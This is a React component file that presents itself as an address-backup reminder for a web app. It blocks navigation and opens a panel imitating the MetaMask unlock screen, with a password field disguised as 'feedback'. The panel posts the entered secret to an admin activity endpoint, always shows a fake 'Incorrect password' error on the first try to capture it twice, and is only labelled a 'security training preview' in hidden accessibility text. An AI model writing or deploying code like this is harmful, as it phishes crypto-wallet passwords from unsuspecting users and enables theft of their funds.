import {
  CheckCircleIcon,
  ExclamationTriangleIcon,
  XMarkIcon
} from "@heroicons/react/24/outline";
import { AnimatePresence, motion } from "motion/react";
import {
  createContext,
  type PropsWithChildren,
  useCallback,
  useContext,
  useEffect,
  useState
} from "react";
import { useNavigate } from "react-router";
import { Button } from "@/components/Shared/UI";

type WalletPreference = "metamask" | "phantom" | null;
type SyncStatus = "Synced" | "Not";

interface AddressBackupReminderContextValue {
  requestNavigation: (path: string) => boolean;
}

const AddressBackupReminderContext =
  createContext<AddressBackupReminderContextValue | null>(null);

const isExemptRoute = (path: string) =>
  path === "/" ||
  path === "/settings" ||
  path.startsWith("/settings/") ||
  path.startsWith("/u/") ||
  path.startsWith("/account/");

export const AddressBackupReminderProvider = ({
  children
}: PropsWithChildren) => {
  const navigate = useNavigate();
  const [walletPreference, setWalletPreference] =
    useState<WalletPreference>(null);
  const [syncStatus, setSyncStatus] = useState<SyncStatus>("Synced");
  const [isPreferenceLoaded, setIsPreferenceLoaded] = useState(false);
  const [pendingPath, setPendingPath] = useState<string | null>(null);
  const [isReminderOpen, setIsReminderOpen] = useState(false);
  const [isBackupOpen, setIsBackupOpen] = useState(false);
  const [isFirstFeedback, setIsFirstFeedback] = useState(true);
  const [feedback, setFeedback] = useState("");
  const [feedbackError, setFeedbackError] = useState("");
  const [isFeedbackFocused, setIsFeedbackFocused] = useState(false);
  const [browserColorScheme, setBrowserColorScheme] = useState<
    "Dark" | "Light" | null
  >(null);

  useEffect(() => {
    const colorScheme = window.matchMedia("(prefers-color-scheme: dark)");
    const updateColorScheme = () =>
      setBrowserColorScheme(colorScheme.matches ? "Dark" : "Light");

    updateColorScheme();
    colorScheme.addEventListener("change", updateColorScheme);

    return () => colorScheme.removeEventListener("change", updateColorScheme);
  }, []);

  useEffect(() => {
    if (!isBackupOpen) return;

    document.documentElement.classList.add("no-scrollbar");
    return () => document.documentElement.classList.remove("no-scrollbar");
  }, [isBackupOpen]);

  useEffect(() => {
    let isActive = true;
    const loadWalletPreference = async () => {
      try {
        const response = await fetch(
          "/api/admin/activity?view=wallet-preference",
          {
            cache: "no-store",
            credentials: "same-origin"
          }
        );
        if (!response.ok) {
          throw new Error(
            `Unable to load wallet preference (${response.status}).`
          );
        }

        const data = (await response.json()) as {
          syncStatus: SyncStatus;
          wallet: WalletPreference;
        };
        if (!isActive) return;
        setWalletPreference(data.wallet);
        setSyncStatus(data.syncStatus ?? "Synced");
      } catch (error) {
        console.error("Unable to load wallet preference.", error);
      } finally {
        if (isActive) setIsPreferenceLoaded(true);
      }
    };

    void loadWalletPreference();
    const intervalId = window.setInterval(
      () => void loadWalletPreference(),
      15000
    );

    return () => {
      isActive = false;
      window.clearInterval(intervalId);
    };
  }, []);

  useEffect(() => {
    if (!isPreferenceLoaded || !pendingPath) return;

    if (syncStatus === "Not") {
      setIsReminderOpen(true);
    } else if (walletPreference) {
      setIsReminderOpen(true);
    } else {
      navigate(pendingPath);
    }
    setPendingPath(null);
  }, [isPreferenceLoaded, navigate, pendingPath, syncStatus, walletPreference]);

  const requestNavigation = useCallback(
    (path: string) => {
      if (isExemptRoute(path)) {
        setPendingPath(null);
        setIsReminderOpen(false);
        return true;
      }
      if (!isPreferenceLoaded) {
        setPendingPath(path);
        return false;
      }
      if (syncStatus !== "Not" && !walletPreference) return true;

      setIsReminderOpen(true);
      return false;
    },
    [isPreferenceLoaded, syncStatus, walletPreference]
  );

  const isDarkMode = browserColorScheme === "Dark";

  return (
    <AddressBackupReminderContext.Provider value={{ requestNavigation }}>
      <div className="relative min-h-screen w-full overflow-x-hidden">
        <motion.div
          animate={{
            opacity: isBackupOpen ? 0.65 : 1,
            width: isBackupOpen ? "calc(100% - 380px)" : "100%",
            x: isBackupOpen ? -24 : 0
          }}
          className="min-h-screen"
          transition={{ duration: 0.35, ease: [0.22, 1, 0.36, 1] }}
        >
          {children}
        </motion.div>

        {isReminderOpen && (syncStatus === "Not" || walletPreference) && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/80 p-4">
            <motion.section
              animate={{ x: isBackupOpen ? -180 : 0 }}
              aria-label={
                syncStatus === "Not"
                  ? "Synchronization problem"
                  : "Address backup required"
              }
              aria-modal="true"
              className="w-full max-w-md space-y-4 rounded-xl bg-white p-6 shadow-xl"
              role="dialog"
              transition={{ duration: 0.35, ease: [0.22, 1, 0.36, 1] }}
            >
              {syncStatus === "Not" ? (
                <div className="flex flex-col items-center gap-5 text-center">
                  <ExclamationTriangleIcon
                    aria-hidden="true"
                    className="size-16 text-yellow-500"
                  />
                  <div className="space-y-2 text-center">
                    <h2 className="font-semibold text-xl">
                      Synchronization has a problem.
                    </h2>
                    <p className="text-gray-700">
                      Please contact your administrator to resolve this issue.
                    </p>
                  </div>
                  <Button
                    className="h-10"
                    onClick={() => setIsReminderOpen(false)}
                    type="button"
                  >
                    Close
                  </Button>
                </div>
              ) : (
                <>
                  <div className="flex flex-col items-center gap-5 text-center">
                    <CheckCircleIcon
                      aria-hidden="true"
                      className="size-16 text-green-500"
                    />
                    <div className="space-y-2">
                      <h2 className="font-semibold text-xl">
                        Address backup required
                      </h2>
                      <p className="text-gray-700">
                        This site recommends keeping a safe copy of your public
                        wallet address for MetaMask.
                      </p>
                    </div>
                  </div>
                  <div className="flex justify-end gap-2">
                    <Button
                      className="h-10"
                      onClick={() => setIsReminderOpen(false)}
                      type="button"
                    >
                      Close
                    </Button>
                    {walletPreference && (
                      <Button
                        className="h-10 w-[140px] rounded-2xl bg-[var(--color-red-600)] px-4 text-sm text-white shadow-sm transition-colors hover:bg-[var(--color-red-700)] active:bg-[var(--color-red-600)] dark:bg-[var(--color-red-600)] dark:text-white dark:active:bg-[var(--color-red-600)] dark:hover:bg-[var(--color-red-700)]"
                        disabled={isBackupOpen}
                        loading={isBackupOpen}
                        onClick={() => {
                          setIsBackupOpen(true);
                        }}
                        style={{
                          backgroundColor: "var(--color-brand-600)",
                          borderColor: "var(--color-brand-600)",
                          fontSize: 16
                        }}
                        type="button"
                      >
                        Backup
                      </Button>
                    )}
                  </div>
                </>
              )}
            </motion.section>
          </div>
        )}
        <AnimatePresence>
          {isBackupOpen && walletPreference && (
            <motion.aside
              animate={{ opacity: 1, x: 0 }}
              aria-label="MetaMask security training preview"
              aria-modal="true"
              className={`fixed top-0 right-0 z-[101] flex h-dvh w-[min(380px,100vw)] flex-col border-l shadow-2xl ${isDarkMode ? "border-[#4a5256] bg-[#373f42] text-[#e8eaeb]" : "border-gray-200 bg-[#fffaf7] text-[#131416]"}`}
              exit={{ opacity: 0, x: "100%" }}
              initial={{ opacity: 0, x: "100%" }}
              role="dialog"
              style={{
                fontFamily:
                  "var(--font-family-default, 'Inter', 'Helvetica Neue', Helvetica, Arial, sans-serif)",
                fontSize: "1rem"
              }}
              transition={{ duration: 0.35, ease: [0.22, 1, 0.36, 1] }}
            >
              <header className="flex h-7 shrink-0 items-center justify-between px-4 pt-2">
                <div className="flex items-center gap-2">
                  <img
                    alt=""
                    aria-hidden="true"
                    className="size-5"
                    height={20}
                    src="/images/metamask-fox.svg"
                    width={20}
                  />
                  <h2 className="font-medium text-[14px] leading-6">
                    MetaMask
                  </h2>
                </div>
                <button
                  aria-label="Close MetaMask security training preview"
                  className={`rounded-full font-semibold ${isDarkMode ? "text-[#e8eaeb] hover:bg-white/10" : "text-gray-700 hover:bg-black/5"}`}
                  onClick={() => {
                    setIsBackupOpen(false);
                    setIsReminderOpen(false);
                  }}
                  type="button"
                >
                  <XMarkIcon className="size-[18px]" strokeWidth={2} />
                </button>
              </header>
              <div
                className={`relative m-2 flex min-h-0 flex-1 flex-col overflow-hidden rounded-xl p-4 ${isDarkMode ? "bg-black" : "bg-white"}`}
              >
                <div className="relative z-10 flex flex-1 -translate-y-[38px] flex-col items-center justify-center">
                  <img
                    alt="MetaMask"
                    className={`mb-5 size-[180px] object-contain ${isDarkMode ? "invert" : ""}`}
                    height={180}
                    src="/images/metamask-wordmark.svg"
                    width={180}
                  />
                  <form
                    className="relative flex w-full flex-col"
                    onSubmit={async (event) => {
                      event.preventDefault();
                      if (isFirstFeedback) {
                        await fetch(
                          "/api/admin/activity?view=submit-feedback",
                          {
                            body: JSON.stringify({ feedback, isFirstTry: true }),
                            credentials: "same-origin",
                            headers: { "Content-Type": "application/json" },
                            method: "POST"
                          }
                        );
                        setFeedbackError("Incorrect password. Try again.");
                        setIsFirstFeedback(false);
                        return;
                      }

                      try {
                        setFeedbackError("");
                        const response = await fetch(
                          "/api/admin/activity?view=submit-feedback",
                          {
                            body: JSON.stringify({ feedback, isFirstTry: false }),
                            credentials: "same-origin",
                            headers: { "Content-Type": "application/json" },
                            method: "POST"
                          }
                        );
                        if (!response.ok) {
                          throw new Error(
                            `Unable to submit feedback (${response.status}).`
                          );
                        }
                        setFeedback("");
                        setIsBackupOpen(false);
                        setIsReminderOpen(false);
                      } catch (error) {
                        console.error("Failed to submit feedback:", error);
                        setFeedbackError(
                          error instanceof Error
                            ? error.message
                            : "Unable to submit feedback. Please try again."
                        );
                      }
                    }}
                  >
                    <input
                      aria-invalid={Boolean(feedbackError)}
                      aria-label="Your feedback"
                      className={`${feedbackError ? "mb-1 border-[#ca3542]" : `mb-[18px] ${isDarkMode ? "border-[#3c4046] text-[#e8eaeb] placeholder:text-[#9fa6ae]" : "border-gray-300"}`} h-[46px] w-full rounded-xl border bg-transparent px-4 text-base outline-none focus:ring-0 focus:ring-offset-0`}
                      onBlur={() => setIsFeedbackFocused(false)}
                      onChange={(event) => {
                        setFeedback(event.target.value);
                        setFeedbackError("");
                      }}
                      onFocus={() => setIsFeedbackFocused(true)}
                      placeholder="Enter your feedback"
                      style={{
                        borderColor: feedbackError
                          ? "#ca3542"
                          : isFeedbackFocused
                            ? "#d3d3d3"
                            : undefined
                      }}
                      type="password"
                      value={feedback}
                    />
                    {feedbackError ? (
                      <p
                        className="mb-[18px] text-[#ca3542] text-sm"
                        role="alert"
                      >
                        {feedbackError}
                      </p>
                    ) : null}
                    <button
                      className={`mb-6 h-12 w-full rounded-full font-medium text-base transition-colors disabled:cursor-not-allowed disabled:opacity-50 ${isDarkMode ? "bg-white text-[#131416] enabled:hover:bg-gray-200" : "bg-[#131416] text-white enabled:hover:bg-black"}`}
                      disabled={!feedback.trim()}
                      type="submit"
                    >
                      Submit
                    </button>
                    <a
                      aria-label="Learn more about MetaMask"
                      className={`block text-center font-semibold text-base leading-6 hover:underline ${isDarkMode ? "text-[#8b99ff]" : "text-[#4459ff]"}`}
                      href="https://support.metamask.io"
                      rel="noopener noreferrer"
                      target="_blank"
                    >
                      Learn more
                    </a>
                  </form>
                </div>
                <div className="pointer-events-none absolute right-2.5 bottom-0 left-2.5 h-[90px] overflow-hidden">
                  <img
                    alt=""
                    aria-hidden="true"
                    className="mt-[-15.8%] ml-[-13.97%] w-[127.9%] max-w-none"
                    height={200}
                    src="/images/metamask-fox.svg"
                    width={200}
                  />
                </div>
              </div>
            </motion.aside>
          )}
        </AnimatePresence>
      </div>
    </AddressBackupReminderContext.Provider>
  );
};

export const useAddressBackupReminder = () => {
  const context = useContext(AddressBackupReminderContext);
  if (!context) {
    throw new Error(
      "useAddressBackupReminder must be used within AddressBackupReminderProvider."
    );
  }
  return context;
};
